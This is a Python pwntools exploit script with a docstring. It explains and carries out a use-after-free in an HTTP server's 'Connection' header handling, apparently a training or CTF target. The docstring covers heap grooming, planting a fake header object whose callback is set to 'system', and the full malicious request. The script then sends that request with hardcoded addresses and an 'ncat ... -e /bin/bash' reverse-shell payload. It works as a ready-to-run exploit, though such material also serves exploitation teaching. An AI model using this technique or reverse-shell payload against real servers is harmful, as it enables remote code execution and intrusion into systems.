#!/usr/bin/env python3
from pwn import * 

'''
Vulnerability
===================
The 'Connection' header is used to DROP headers within 'interpret_header'.
However, these are NEVER cleared, which results in a use after free
within other classes to 'interpret_header', parse_body and the actual
processing of the headers in 'example.c'.

Eventually, the request information gets cleaned up in 'cleanup_request'. 
At this point, it attempts to clean up the headers in 'req_header_lst'. 
When this happens, it will free the fields of a header and the header itself.
Since we can free the header in 'interpret_header', this leads to an eventual
double free as well. 

Exploitation Thoughts
========================
There are two potential paths to exploitation: 
- Use after free (UAF) on header
- Double free

With the UAF, we can swap in a FAKE 'struct header'. Since this has a function 
pointer inside of it, this object makes for an amazing target. This is shown 
below: 
```
struct header {
    char* name; // Key of the header (name)
    size_t name_len;
    char* value; // Value of the header
    size_t value_len; 
    void* (*custom_callback)(); 
}; 
```

Our general plan of attack is as follows: 
- Trigger UAF by dropping header in the 'Connection' header.
- Allocate this chunk with user controllable data for a fake 'struct header'.
- Call malicious function pointer with our fake object. 

Grooming
==============

Nothing major needs to be done in order set up the heap in a favorable
way prior to the use after free. Whoo!

Once the use after free has occurred, our 'struct header' will be put
into the 0x30 TCache bin. In order to put our fake object here, we will
need to allocate a chunk from the 0x30 TCache Bin with data that we control. 

There are many allocations that allow us to control BOTH the data inside 
and the LENGTH of the data: 
- Host, Origin and User-Agent header values
- X-Request-Id header value

By specifying the 'User-Agent' header, an allocation is made that depends
on the size of the 'header->value_len'. So, if we allocate the 'User-Agent'
with 0x20 bytes, it will allocate the TCache bin chunk from our 'struct
header', as mentioned before in the LIFO manner of the bin. 

Exploitation
===================
Now, we can craft a FAKE 'struct header' within the 'value' of our 'User-Agent'
header.
0-7: name pointer
8-15: name_len
16-23: value pointer
24-31: value_len
32-40: callback_function pointer

The function call looks like this: 
- (req_header_lst[index]->custom_callback)(req_header_lst[index]->name, req_header_lst[index]->value);

'system' being set as the function pointer should work just fine. 
This is because we are passing in `req_header_lst[index]->name` and 
`req_header_lst[index]->value` as parameters to the function pointer. As a result, 
if we provide the 'name' pointer as our 'payload', it will be used in our call
to 'system'.

The full request looks as shown below: 
```
POST /SomeRoute HTTP/1.1
Connection:Host
MyPayload:ncat 127.0.0.1 4444 -e /bin/bash
User-Agent: <fake header obj>
Host: hacker.com
```

To recap:
- Connection:Host is used to cause a use after free on the final header
- 'MyPayload' contains the bash command to be ran in system. 
- 'User-Agent' contains the object swapped into the 'Host' header slot to hijack control flow. 
- Host header is the chunk being taken advantage of for the UAF. 


NOTE: Only the 'name' pointer and 'callback' pointer need to be valid for this 
exploit to work for the 'struct header' object.

NOTE2: To get the shell to pop while using GDB, run 'set detach-on-fork on'. 

'''

p = remote("127.0.0.1", 8081) 
p.newline = b"\r\n" # Newlines for the 'sendline'


first_line = b"POST /SomeRoute HTTP/1.1"
p.sendline(first_line) 


p.sendline(b"Connection:Host") # Free the 'host' header to create a UAF

# Payload for 'system' later. Point our fake 'header->value' to this address
payload_header = "MyPayload:ncat 127.0.0.1 4444 -e /bin/bash\x00"
p.sendline(payload_header) 

# Payload MUST allocate our chunk from the 0x30 bin. 
# Must be an allocation between 0x19-0x28 in order to work. 
# The fake object is below
fake_header_obj = p64(0x55555555ea70) 
fake_header_obj += p64(0x30) 
fake_header_obj += p64(0x55555555ea70) 
fake_header_obj += p64(0x30) 
fake_header_obj += p64(0x7ffff7e152c0)

# User Agent will allocate a string of our choosing with a size of our choosing. Perfect!
p.sendline(b"User-Agent:" + fake_header_obj)
p.sendline(b"Host:" + b"X" * 0x20) # Header that is used for exploitation

# End the sending of headers
p.sendline(b"")

p.interactive()
